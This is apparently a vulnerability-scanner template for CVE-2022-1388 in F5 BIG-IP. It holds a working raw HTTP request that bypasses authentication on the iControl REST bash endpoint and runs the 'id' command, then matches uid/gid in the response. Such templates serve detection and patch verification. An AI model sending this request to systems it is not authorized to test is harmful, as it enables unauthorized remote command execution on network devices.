id: f5-rce
info:
  author: Str1am
  name: cve-2022-1388
  severity: critical
  tags: f5,rce
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - commandResult
    - uid
    - gid
  matchers-condition: and
  raw:
  - 'POST /mgmt/tm/util/bash HTTP/1.1

    Host: {{Hostname}}

    Connection: keep-alive, X-F5-Auth-Token

    X-F5-Auth-Token: a

    Authorization: Basic YWRtaW46

    Content-Length: 39


    {"command":"run","utilCmdArgs":"-c id"}

    '
